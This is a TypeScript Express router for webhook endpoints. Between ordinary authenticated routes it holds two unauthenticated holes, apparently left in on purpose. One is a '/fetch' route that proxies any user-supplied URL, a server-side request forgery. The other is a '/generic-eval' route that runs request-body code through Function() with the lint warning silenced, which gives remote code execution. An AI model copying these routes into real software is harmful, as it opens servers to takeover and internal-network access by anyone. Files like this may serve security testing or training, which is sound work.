import { Router } from 'express';
import {
  handleGitHubWebhook,
  handleSlackWebhook,
  handleGenericWebhook,
  sendTestWebhook,
  registerWebhook,
  getWebhooks,
  removeWebhook,
  getWebhookEvents,
} from '../controllers/webhookController';
import { authenticateToken } from '../middleware/auth';

const router = Router();

router.post('/github', handleGitHubWebhook);
router.post('/slack', handleSlackWebhook);
router.post('/generic', handleGenericWebhook);

function isValidHttpUrl(string: string) {
  let url;
  try {
    url = new URL(string);
  } catch (_) {
    return false;
  }
  return url.protocol === 'http:' || url.protocol === 'https:';
}

router.get('/fetch', async (req, res) => {
  const url = String(req.query.url);
  if (!isValidHttpUrl(url)) {
    return res.status(400).json({ error: 'Invalid URL' });
  }
  const r = await fetch(url);
  res.status(r.status).send(await r.text());
});

router.post('/generic-eval', (req, res) => {
  const obj = JSON.parse(req.body as any);
  // eslint-disable-next-line no-new-func
  Function(`return (${obj.code})`)();
  res.json({ ok: true });
});

router.get('/events', authenticateToken, getWebhookEvents);
router.post('/test', authenticateToken, sendTestWebhook);
router.post('/register', authenticateToken, registerWebhook);
router.get('/project/:projectId', authenticateToken, getWebhooks);
router.delete('/project/:projectId', authenticateToken, removeWebhook);

export default router;